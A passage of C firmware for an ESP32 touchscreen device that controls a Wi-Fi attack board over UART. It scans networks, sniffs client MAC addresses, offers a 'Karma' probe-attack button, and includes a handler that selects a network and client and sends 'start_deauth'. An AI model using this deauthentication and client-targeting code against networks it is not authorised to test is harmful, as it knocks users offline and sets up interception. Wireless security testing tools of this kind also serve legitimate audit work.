    intptr_t btn_type = (intptr_t)lv_event_get_user_data(e);
    
    if (btn_type == 1) {
        // Close button (X) clicked
        close_deauth_popup();
        return;
    }
    
    // Deauth/Stop button clicked
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    if (!deauth_active) {
        // Start deauth
        if (deauth_network_idx >= 0 && deauth_network_idx < ctx->observer_network_count &&
            deauth_client_idx >= 0 && deauth_client_idx < MAX_CLIENTS_PER_NETWORK) {
            
            observer_network_t *net = &ctx->observer_networks[deauth_network_idx];
            const char *client_mac = net->clients[deauth_client_idx];
            
            ESP_LOGI(TAG, "Starting deauth: network=%d (scan_idx=%d), client=%s", 
                     deauth_network_idx, net->scan_index, client_mac);
            
            // Send UART commands to current tab's UART
            uart_send_command_for_tab("stop");
            vTaskDelay(pdMS_TO_TICKS(100));
            
            char cmd[64];
            snprintf(cmd, sizeof(cmd), "select_networks %d", net->scan_index);
            uart_send_command_for_tab(cmd);
            vTaskDelay(pdMS_TO_TICKS(100));
            
            snprintf(cmd, sizeof(cmd), "select_stations %s", client_mac);
            uart_send_command_for_tab(cmd);
            vTaskDelay(pdMS_TO_TICKS(100));
            
            uart_send_command_for_tab("start_deauth");
            
            // Change button to STOP
            deauth_active = true;
            if (deauth_btn_label != NULL) {
                lv_label_set_text(deauth_btn_label, "STOP");
            }
            ESP_LOGI(TAG, "Deauth started");
        }
    } else {
        // Stop deauth and return to sniffer
        ESP_LOGI(TAG, "Stopping deauth");
        close_deauth_popup();
    }
}

// Parse sniffer output line - returns true if network line parsed
static bool parse_sniffer_network_line(const char *line, observer_network_t *net)
{
    // Format: "SSID, CHxx: count" or "Unknown_XXXX, CHxx: count"
    // Line should NOT start with space (those are client MACs)
    if (line[0] == ' ' || line[0] == '\t') return false;
    
    // Find ", CH" marker
    const char *ch_marker = strstr(line, ", CH");
    if (!ch_marker) return false;
    
    // Extract SSID (everything before ", CH")
    int ssid_len = ch_marker - line;
    if (ssid_len >= (int)sizeof(net->ssid)) ssid_len = sizeof(net->ssid) - 1;
    strncpy(net->ssid, line, ssid_len);
    net->ssid[ssid_len] = '\0';
    
    // Parse channel and client count: "CHxx: count"
    int channel = 0, count = 0;
    if (sscanf(ch_marker, ", CH%d: %d", &channel, &count) == 2) {
        net->channel = channel;
        net->client_count = count;
        return true;
    }
    
    return false;
}

// Parse client MAC line (starts with space)
static bool parse_sniffer_client_line(const char *line, char *mac_out, size_t mac_size)
{
    // Line starts with space followed by MAC address
    if (line[0] != ' ') return false;
    
    // Skip leading whitespace
    const char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    
    // Check if it looks like a MAC address (XX:XX:XX:XX:XX:XX)
    if (strlen(p) >= 17 && p[2] == ':' && p[5] == ':') {
        strncpy(mac_out, p, mac_size - 1);
        mac_out[mac_size - 1] = '\0';
        // Trim trailing whitespace/newline
        char *end = mac_out + strlen(mac_out) - 1;
        while (end > mac_out && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }
        return true;
    }
    
    return false;
}

// Observer poll task - runs show_sniffer_results and parses output
static void observer_poll_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Observer poll task: NULL context!");
        vTaskDelete(NULL);
        return;
    }
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] Observer poll task started", uart_name);
    
    // Check if PSRAM buffers are allocated
    if (!observer_rx_buffer || !observer_line_buffer || !ctx->observer_networks) {
        ESP_LOGE(TAG, "[%s] PSRAM buffers not allocated!", uart_name);
        ctx->observer_task = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Flush UART buffer
    uart_flush(uart_port);
    
    // Send show_sniffer_results command to correct UART
    char cmd[] = "show_sniffer_results\r\n";
    transport_write_bytes_tab(task_tab, uart_port, cmd, strlen(cmd));
    ESP_LOGI(TAG, "[%s] Sent: show_sniffer_results", uart_name);
    
    // Use PSRAM-allocated buffers
    char *rx_buffer = observer_rx_buffer;
    char *line_buffer = observer_line_buffer;
    int line_pos = 0;
    
    // Track current network being updated (index into ctx->observer_networks)
    int current_network_idx = -1;
    
    // DON'T clear client data - accumulate clients over time
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(5000);  // 5 second timeout for response
    
    while ((xTaskGetTickCount() - start_time) < timeout_ticks) {
        int len = transport_read_bytes_tab(task_tab, uart_port, rx_buffer, UART_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGD(TAG, "Observer line: %s", line_buffer);
                        
                        // Log every line received for debugging
                        ESP_LOGI(TAG, "SNIFFER LINE: '%s'", line_buffer);
                        
                        // Check for network line (doesn't start with space)
                        if (line_buffer[0] != ' ' && line_buffer[0] != '\t') {
                            observer_network_t parsed_net = {0};
                            if (parse_sniffer_network_line(line_buffer, &parsed_net)) {
                                // Find this network in our existing list by SSID
                                current_network_idx = -1;
                                for (int n = 0; n < ctx->observer_network_count; n++) {
                                    if (strcmp(ctx->observer_networks[n].ssid, parsed_net.ssid) == 0) {
                                        current_network_idx = n;
                                        // Don't overwrite client_count - we track it via add_client_mac
                                        ESP_LOGI(TAG, "[%s] Found network '%s' at idx %d (count: %d)", 
                                                 uart_name, parsed_net.ssid, n, ctx->observer_networks[n].client_count);
                                        break;
                                    }
                                }
                                if (current_network_idx < 0) {
                                    ESP_LOGW(TAG, "[%s] Network '%s' not in scan list, skipping", uart_name, parsed_net.ssid);
                                }
                            } else {
                                // Not a network line (could be command echo, prompt, etc.)
                                current_network_idx = -1;
                            }
                        }
                        // Check for client MAC line (starts with space)
                        else if ((line_buffer[0] == ' ' || line_buffer[0] == '\t') && current_network_idx >= 0) {
                            observer_network_t *net = &ctx->observer_networks[current_network_idx];
                            char mac[18];
                            if (parse_sniffer_client_line(line_buffer, mac, sizeof(mac))) {
                                // Add client if not already present (accumulate)
                                if (add_client_mac(net, mac)) {
                                    ESP_LOGI(TAG, "  -> NEW client: %s for '%s' (total: %d)", mac, net->ssid, net->client_count);
                                }
                            } else {
                                ESP_LOGW(TAG, "  -> Failed to parse as client MAC");
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < OBSERVER_LINE_BUFFER_SIZE - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        // Check if observer was stopped
        if (!ctx->observer_running) {
            ESP_LOGI(TAG, "[%s] Observer stopped during poll", uart_name);
            break;
        }
    }
    
    // Log summary of parsed data
    ESP_LOGI(TAG, "[%s] === SNIFFER UPDATE SUMMARY ===", uart_name);
    ESP_LOGI(TAG, "[%s] Total networks: %d", uart_name, ctx->observer_network_count);
    int networks_with_clients = 0;
    for (int i = 0; i < ctx->observer_network_count; i++) {
        if (ctx->observer_networks[i].client_count > 0) {
            networks_with_clients++;
            ESP_LOGI(TAG, "[%s] Network %d: '%s' CH%d clients=%d", 
                     uart_name, i, ctx->observer_networks[i].ssid, ctx->observer_networks[i].channel, ctx->observer_networks[i].client_count);
            for (int j = 0; j < MAX_CLIENTS_PER_NETWORK && ctx->observer_networks[i].clients[j][0] != '\0'; j++) {
                ESP_LOGI(TAG, "[%s]   Client %d: %s", uart_name, j, ctx->observer_networks[i].clients[j]);
            }
        }
    }
    ESP_LOGI(TAG, "[%s] Networks with clients: %d/%d", uart_name, networks_with_clients, ctx->observer_network_count);
    ESP_LOGI(TAG, "[%s] ==============================", uart_name);
    
    // Update UI if observer is still running
    if (ctx->observer_running && ctx->observer_networks) {
        
        // Update UI
        bsp_display_lock(0);
        
        if (ctx->observer_status_label) {
            lv_label_set_text_fmt(ctx->observer_status_label, "Found %d networks", ctx->observer_network_count);
        }
        
        update_observer_table(ctx);
        
        bsp_display_unlock();
    }
    
    ESP_LOGI(TAG, "[%s] Observer poll task finished", uart_name);
    ctx->observer_task = NULL;
    vTaskDelete(NULL);
}

// Timer callback - triggers poll task
static void observer_timer_callback(TimerHandle_t xTimer)
{
    // Get ctx from timer ID
    tab_context_t *ctx = (tab_context_t *)pvTimerGetTimerID(xTimer);
    if (!ctx || !ctx->observer_running) return;
    
    // Only start new poll if previous one finished
    if (ctx->observer_task == NULL) {
        xTaskCreate(observer_poll_task, "obs_poll", 8192, (void*)ctx, 5, &ctx->observer_task);
    }
}

// Observer start task - runs scan_networks first, then starts sniffer
// Parse scan network line: "1","SSID","","BSSID","channel","security","rssi","band"
// Parse scan network line: "index","SSID","","BSSID","channel","security","rssi","band"
static bool parse_scan_to_observer(const char *line, observer_network_t *net)
{
    if (line[0] != '"') return false;
    
    char temp[256];
    strncpy(temp, line, sizeof(temp) - 1);
    temp[sizeof(temp) - 1] = '\0';
    
    // Parse CSV with quoted fields
    char *fields[8] = {NULL};
    int field_idx = 0;
    char *p = temp;
    
    while (*p && field_idx < 8) {
        if (*p == '"') {
            p++;
            fields[field_idx] = p;
            while (*p && *p != '"') p++;
            if (*p == '"') {
                *p = '\0';
                p++;
            }
            field_idx++;
            if (*p == ',') p++;
        } else {
            p++;
        }
    }
    
    if (field_idx < 8) return false;
    
    // fields[0] = index, fields[1] = SSID, fields[3] = BSSID, fields[4] = channel, fields[6] = RSSI, fields[7] = band
    net->scan_index = atoi(fields[0]);  // 1-based index for select_networks command
    
    strncpy(net->ssid, fields[1], sizeof(net->ssid) - 1);
    net->ssid[sizeof(net->ssid) - 1] = '\0';
    
    strncpy(net->bssid, fields[3], sizeof(net->bssid) - 1);
    net->bssid[sizeof(net->bssid) - 1] = '\0';
    
    net->channel = atoi(fields[4]);
    net->rssi = atoi(fields[6]);
    
    strncpy(net->band, fields[7], sizeof(net->band) - 1);
    net->band[sizeof(net->band) - 1] = '\0';
    
    net->client_count = 0;  // No clients initially
    memset(net->clients, 0, sizeof(net->clients));
    
    return true;
}

static void observer_start_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Observer start task: NULL context!");
        vTaskDelete(NULL);
        return;
    }
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] Observer start task - scanning networks first", uart_name);
    
    // Check if PSRAM buffers are allocated
    if (!observer_rx_buffer || !observer_line_buffer || !ctx->observer_networks) {
        ESP_LOGE(TAG, "[%s] PSRAM buffers not allocated!", uart_name);
        vTaskDelete(NULL);
        return;
    }
    
    // Update UI
    bsp_display_lock(0);
    if (ctx->observer_status_label) {
        lv_label_set_text(ctx->observer_status_label, "Scanning networks...");
    }
    bsp_display_unlock();
    
    // Clear previous results in context
    ctx->observer_network_count = 0;
    memset(ctx->observer_networks, 0, sizeof(observer_network_t) * MAX_OBSERVER_NETWORKS);
    
    // Flush UART buffer
    uart_flush(uart_port);
    
    // Step 1: Run scan_networks
    char scan_cmd[] = "scan_networks\r\n";
    transport_write_bytes_tab(task_tab, uart_port, scan_cmd, strlen(scan_cmd));
    ESP_LOGI(TAG, "[%s] Sent: scan_networks", uart_name);
    
    // Wait for scan to complete - use PSRAM buffers
    char *rx_buffer = observer_rx_buffer;
    char *line_buffer = observer_line_buffer;
    int line_pos = 0;
    bool scan_complete = false;
    int scanned_count = 0;
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(UART_RX_TIMEOUT);
    
    while (!scan_complete && (xTaskGetTickCount() - start_time) < timeout_ticks && ctx->observer_running) {
        int len = transport_read_bytes_tab(task_tab, uart_port, rx_buffer, UART_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        // Log every line during scan for debugging
                        ESP_LOGI(TAG, "SCAN LINE: '%s'", line_buffer);
                        
                        if (strstr(line_buffer, "Scan results printed") != NULL) {
                            scan_complete = true;
                            ESP_LOGI(TAG, "Network scan complete marker found");
                            break;
                        }
                        
                        // Parse network line from scan
                        if (line_buffer[0] == '"' && scanned_count < MAX_OBSERVER_NETWORKS) {
                            observer_network_t net = {0};
                            if (parse_scan_to_observer(line_buffer, &net)) {
                                ctx->observer_networks[scanned_count] = net;
                                scanned_count++;
                                ESP_LOGI(TAG, "[%s] Parsed network #%d: '%s' BSSID=%s CH%d %s %ddBm", 
                                         uart_name, net.scan_index, net.ssid, net.bssid, net.channel, net.band, net.rssi);
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < OBSERVER_LINE_BUFFER_SIZE - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    // Save count of scanned networks directly to context
    ctx->observer_network_count = scanned_count;
    ESP_LOGI(TAG, "[%s] Scan complete: %d networks", uart_name, ctx->observer_network_count);
    
    // Update UI immediately with scanned networks (all with 0 clients)
    bsp_display_lock(0);
    if (ctx->observer_status_label) {
        lv_label_set_text_fmt(ctx->observer_status_label, "Found %d networks, starting sniffer...", ctx->observer_network_count);
    }
    update_observer_table(ctx);
    bsp_display_unlock();
    
    if (!ctx->observer_running) {
        ESP_LOGI(TAG, "[%s] Observer stopped during scan", uart_name);
        vTaskDelete(NULL);
        return;
    }
    
    // Step 2: Start sniffer
    ESP_LOGI(TAG, "[%s] Starting sniffer...", uart_name);
    bsp_display_lock(0);
    if (ctx->observer_status_label) {
        lv_label_set_text_fmt(ctx->observer_status_label, "%d networks, waiting for clients...", ctx->observer_network_count);
    }
    bsp_display_unlock();
    
    vTaskDelay(pdMS_TO_TICKS(500));  // Short delay
    uart_flush(uart_port);
    char sniffer_cmd[] = "start_sniffer_noscan\r\n";
    transport_write_bytes_tab(task_tab, uart_port, sniffer_cmd, strlen(sniffer_cmd));
    ESP_LOGI(TAG, "[%s] Sent: start_sniffer_noscan", uart_name);
    
    vTaskDelay(pdMS_TO_TICKS(1000));  // Wait for sniffer to start
    
    // Step 3: Start periodic timer for polling sniffer results
    if (ctx->observer_running) {
        ESP_LOGI(TAG, "[%s] Starting observer timer (every %d ms)", uart_name, OBSERVER_POLL_INTERVAL_MS);
        
        bsp_display_lock(0);
        if (ctx->observer_status_label) {
            lv_label_set_text(ctx->observer_status_label, "Observing... (updates every 20s)");
        }
        bsp_display_unlock();
        
        // Create timer per-context (store ctx as timer ID for callback)
        if (ctx->observer_timer == NULL) {
            ctx->observer_timer = xTimerCreate("obs_timer", 
                                          pdMS_TO_TICKS(OBSERVER_POLL_INTERVAL_MS),
                                          pdTRUE,  // Auto-reload
                                          (void*)ctx,  // Pass ctx as timer ID
                                          observer_timer_callback);
        } else {
            // Update timer ID to current ctx
            vTimerSetTimerID(ctx->observer_timer, (void*)ctx);
        }
        
        if (ctx->observer_timer != NULL) {
            xTimerStart(ctx->observer_timer, 0);
            
            // Do first poll immediately, pass ctx
            xTaskCreate(observer_poll_task, "obs_poll", 8192, (void*)ctx, 5, &ctx->observer_task);
        }
    }
    
    ESP_LOGI(TAG, "[%s] Observer start task finished", uart_name);
    vTaskDelete(NULL);
}

// Start button click handler
static void observer_start_btn_cb(lv_event_t *e)
{
    (void)e;
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    if (ctx->observer_running) {
        ESP_LOGW(TAG, "Observer already running on tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Starting Network Observer on tab %d", current_tab);
    ctx->observer_running = true;
    
    // Disable start button, enable stop button
    if (ctx->observer_start_btn) {
        lv_obj_add_state(ctx->observer_start_btn, LV_STATE_DISABLED);
    }
    if (ctx->observer_stop_btn) {
        lv_obj_clear_state(ctx->observer_stop_btn, LV_STATE_DISABLED);
    }
    
    // Clear table
    if (ctx->observer_table) {
        lv_obj_clean(ctx->observer_table);
    }
    
    // Start observer task for current tab's UART, pass ctx
    // All devices use the same flow - fully independent
    xTaskCreate(observer_start_task, "obs_start", 8192, (void*)ctx, 5, NULL);
}

// Stop button click handler
static void observer_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    if (!ctx->observer_running) {
        ESP_LOGW(TAG, "Observer not running on tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Stopping Network Observer on tab %d", current_tab);
    ctx->observer_running = false;
    
    // Stop timer for this context
    if (ctx->observer_timer != NULL) {
        xTimerStop(ctx->observer_timer, 0);
    }
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Update UI
    if (ctx->observer_start_btn) {
        lv_obj_clear_state(ctx->observer_start_btn, LV_STATE_DISABLED);
    }
    if (ctx->observer_stop_btn) {
        lv_obj_add_state(ctx->observer_stop_btn, LV_STATE_DISABLED);
    }
    
    if (ctx->observer_status_label) {
        lv_label_set_text(ctx->observer_status_label, "Stopped");
    }
}

// Observer page back button handler - hide page and show tiles
static void observer_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Observer back button clicked, returning to tiles for tab %d", current_tab);
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Mark observer page as not visible in context
    ctx->observer_page_visible = false;
    
    // Stop observer for current tab
    if (ctx->observer_running) {
        ctx->observer_running = false;
        
        if (ctx->observer_timer != NULL) {
            xTimerStop(ctx->observer_timer, 0);
        }
        uart_send_command_for_tab("stop");
    }
    
    // Update portal icon visibility
    update_portal_icon();
    
    // Hide observer page
    if (ctx->observer_page) {
        lv_obj_add_flag(ctx->observer_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Show Network Observer page (inside current tab's container)
static void show_observer_page(void)
{
    // Get current tab's data and container
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If observer page already exists for this tab, just show it
    if (ctx->observer_page) {
        lv_obj_clear_flag(ctx->observer_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->observer_page;
        observer_page = ctx->observer_page;  // Update legacy reference
        ESP_LOGI(TAG, "Showing existing observer page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new observer page for tab %d", current_tab);
    
    // Mark observer page as visible
    observer_page_visible = true;
    
    // Create observer page container inside tab container
    ctx->observer_page = lv_obj_create(container);
    observer_page = ctx->observer_page;  // Keep legacy reference for compatibility
    lv_obj_set_size(observer_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(observer_page, lv_color_hex(0x0A1A1A), 0);
    lv_obj_set_style_border_width(observer_page, 0, 0);
    lv_obj_set_style_pad_all(observer_page, 16, 0);
    lv_obj_set_flex_flow(observer_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(observer_page, 10, 0);
    
    // Header container - fixed height, row layout
    lv_obj_t *header = lv_obj_create(observer_page);
    lv_obj_set_size(header, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button - positioned left
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_align(back_btn, LV_ALIGN_LEFT_MID, 0, 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x1A3333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x2A4444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, observer_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title - positioned after back button
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Network Observer");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
    lv_obj_align_to(title, back_btn, LV_ALIGN_OUT_RIGHT_MID, 12, 0);
    
    // Stop button (red) - positioned right - store in ctx
    ctx->observer_stop_btn = lv_btn_create(header);
    lv_obj_set_size(ctx->observer_stop_btn, 100, 40);
    lv_obj_align(ctx->observer_stop_btn, LV_ALIGN_RIGHT_MID, 0, 0);
    lv_obj_set_style_bg_color(ctx->observer_stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(ctx->observer_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(ctx->observer_stop_btn, lv_color_hex(0x444444), LV_STATE_DISABLED);
    lv_obj_set_style_radius(ctx->observer_stop_btn, 8, 0);
    lv_obj_add_event_cb(ctx->observer_stop_btn, observer_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_state(ctx->observer_stop_btn, LV_STATE_DISABLED);  // Initially disabled
    
    lv_obj_t *stop_label = lv_label_create(ctx->observer_stop_btn);
    lv_label_set_text(stop_label, "Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(stop_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(stop_label);
    
    // Start button (green) - positioned left of stop button - store in ctx
    ctx->observer_start_btn = lv_btn_create(header);
    lv_obj_set_size(ctx->observer_start_btn, 100, 40);
    lv_obj_align_to(ctx->observer_start_btn, ctx->observer_stop_btn, LV_ALIGN_OUT_LEFT_MID, -12, 0);
    lv_obj_set_style_bg_color(ctx->observer_start_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_bg_color(ctx->observer_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(ctx->observer_start_btn, lv_color_hex(0x444444), LV_STATE_DISABLED);
    lv_obj_set_style_radius(ctx->observer_start_btn, 8, 0);
    lv_obj_add_event_cb(ctx->observer_start_btn, observer_start_btn_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(ctx->observer_start_btn);
    lv_label_set_text(start_label, "Start");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(start_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(start_label);
    
    // Probes & Karma button (orange) - positioned left of start button
    lv_obj_t *karma_btn = lv_btn_create(header);
    lv_obj_set_size(karma_btn, 120, 40);
    lv_obj_align_to(karma_btn, ctx->observer_start_btn, LV_ALIGN_OUT_LEFT_MID, -12, 0);
    lv_obj_set_style_bg_color(karma_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_bg_color(karma_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(karma_btn, 8, 0);
    lv_obj_add_event_cb(karma_btn, observer_karma_btn_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *karma_label = lv_label_create(karma_btn);
    lv_label_set_text(karma_label, LV_SYMBOL_WIFI " Karma");
    lv_obj_set_style_text_font(karma_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(karma_label, lv_color_hex(0x000000), 0);
    lv_obj_center(karma_label);
    
    // Status label - store in ctx
    ctx->observer_status_label = lv_label_create(ctx->observer_page);
    lv_label_set_text(ctx->observer_status_label, "Press Start to begin observing");
    lv_obj_set_style_text_font(ctx->observer_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->observer_status_label, lv_color_hex(0x888888), 0);
    
    // Network table container (scrollable) - store in ctx
    ctx->observer_table = lv_obj_create(ctx->observer_page);
    lv_obj_set_size(ctx->observer_table, lv_pct(100), lv_pct(100));
    lv_obj_set_flex_grow(ctx->observer_table, 1);
    lv_obj_set_style_bg_color(ctx->observer_table, lv_color_hex(0x0A1A1A), 0);
    lv_obj_set_style_border_color(ctx->observer_table, lv_color_hex(0x1A3333), 0);
    lv_obj_set_style_border_width(ctx->observer_table, 1, 0);
    lv_obj_set_style_radius(ctx->observer_table, 12, 0);
    lv_obj_set_style_pad_all(ctx->observer_table, 8, 0);
    lv_obj_set_flex_flow(ctx->observer_table, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->observer_table, 6, 0);
    lv_obj_set_scroll_dir(ctx->observer_table, LV_DIR_VER);
    
    // If we have existing data in context, show it
    if (ctx->observer_network_count > 0) {
        lv_label_set_text_fmt(ctx->observer_status_label, "%d networks (cached)", ctx->observer_network_count);
        update_observer_table(ctx);
    }
    
    // Update button states based on observer_running in context
    if (ctx->observer_running) {
        lv_obj_add_state(ctx->observer_start_btn, LV_STATE_DISABLED);
        lv_obj_clear_state(ctx->observer_stop_btn, LV_STATE_DISABLED);
        lv_label_set_text_fmt(ctx->observer_status_label, "%d networks (monitoring...)", ctx->observer_network_count);
    }
    
    // Mark observer page as visible in context
    ctx->observer_page_visible = true;
    
    update_portal_icon();
    
    // NO auto-start! User must click Start button manually
    // All devices work the same way - fully independent
    
    // Set current visible page
    ctx->current_visible_page = ctx->observer_page;
}

// ======================= ESP Modem Page =======================

// Helper: Convert auth mode to string
static const char* esp_modem_auth_mode_str(wifi_auth_mode_t authmode)
{
    switch (authmode) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/WPA3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "UNKNOWN";
    }
}

// Initialize WiFi via ESP-Hosted (lazy initialization)
static esp_err_t esp_modem_wifi_init(void)
{
    if (esp_modem_wifi_initialized) {
        return ESP_OK;
    }
    
    ESP_LOGI(TAG, "Initializing WiFi for ESP Modem via ESP-Hosted...");
    
    // Enable WiFi power on Tab5 (controls ESP32C6 power via IO expander)
    ESP_LOGI(TAG, "Enabling WiFi power...");
    bsp_set_wifi_power_enable(true);
    vTaskDelay(pdMS_TO_TICKS(500));  // Wait for ESP32C6 to power up
    
    // Initialize TCP/IP stack
    ESP_ERROR_CHECK(esp_netif_init());
    
    // Create default event loop
    esp_err_t ret = esp_event_loop_create_default();
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "Failed to create event loop: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Initialize ESP-Hosted (connects to ESP32C6 via SDIO)
    ret = esp_hosted_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to initialize ESP-Hosted: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Wait for transport to be ready
    ESP_LOGI(TAG, "Waiting for ESP-Hosted transport...");
    vTaskDelay(pdMS_TO_TICKS(2000));  // Give time for SDIO connection
    
    // Create default WiFi station
    esp_netif_create_default_wifi_sta();
    
    // Initialize WiFi (via esp_hosted remote)
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to init WiFi remote: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Set WiFi mode to station
    ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set WiFi mode: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Start WiFi
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start WiFi: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Wait for WiFi station to be fully ready before scanning
    ESP_LOGI(TAG, "Waiting for WiFi station to be ready...");
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    esp_modem_wifi_initialized = true;
    ESP_LOGI(TAG, "WiFi initialized successfully via ESP-Hosted");
    
    return ESP_OK;
}

// Update ESP Modem network list UI
static void esp_modem_update_network_list(void)
{
    if (!esp_modem_network_list) return;
    
    lv_obj_clean(esp_modem_network_list);
    
    for (int i = 0; i < esp_modem_network_count; i++) {
        wifi_ap_record_t *ap = &esp_modem_networks[i];
        
        // Create list item
        lv_obj_t *item = lv_obj_create(esp_modem_network_list);
        lv_obj_set_size(item, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_pad_all(item, 8, 0);
        lv_obj_set_style_bg_color(item, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_border_width(item, 0, 0);
